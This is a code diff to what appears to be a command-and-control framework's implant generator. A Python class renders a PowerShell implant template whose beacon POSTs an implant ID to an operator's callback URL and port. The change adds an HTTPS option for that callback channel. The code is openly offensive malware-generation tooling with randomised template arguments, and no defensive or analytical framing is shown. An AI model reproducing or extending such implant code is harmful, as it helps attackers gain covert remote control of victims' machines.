@@ -52,7 +52,7 @@ class ImplantGenerator():
             $headers = @{}
             $headers.Add("X-Implant","{{ uii }}")
             try {
-                $LoginResponse = Invoke-WebRequest 'http://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
+                $LoginResponse = Invoke-WebRequest '{{ http }}://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
             }
             catch {
                 $_.Exception | format-list -Force
@@ -111,6 +111,10 @@ class ImplantGenerator():
         else:
             JRA = self.JinjaRandomisedArgs
         cc = jinja2.Template(RandomisedJinjaTemplate)
-        output_from_parsed_template = cc.render(url=JinjaArgs['callback_url'], port=JinjaArgs['port'], uii=JinjaArgs['unique_implant_id'], ron=JRA)
+        if JinjaArgs['comms_https'] == 1:
+            http_proto = "https"
+        else:
+            http_proto = "http"
+        output_from_parsed_template = cc.render(http=http_proto, url=JinjaArgs['callback_url'], port=JinjaArgs['port'], uii=JinjaArgs['unique_implant_id'], ron=JRA)
         return output_from_parsed_template
 
